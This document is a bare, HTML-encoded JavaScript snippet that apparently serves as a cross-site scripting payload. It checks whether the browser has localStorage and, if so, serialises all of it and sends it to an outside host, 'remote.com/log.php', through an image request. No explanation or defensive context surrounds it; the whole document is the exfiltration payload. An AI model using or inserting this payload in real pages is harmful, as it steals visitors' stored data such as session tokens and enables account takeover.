
if (&#39;localStorage&#39; in window &amp;&amp; window[&#39;localStorage&#39;] !== null) {
    new Image().src = &#39;http://remote.com/log.php?localStorage=&#39;+JSON.stringify(window[&#39;localStorage&#39;]);
} 


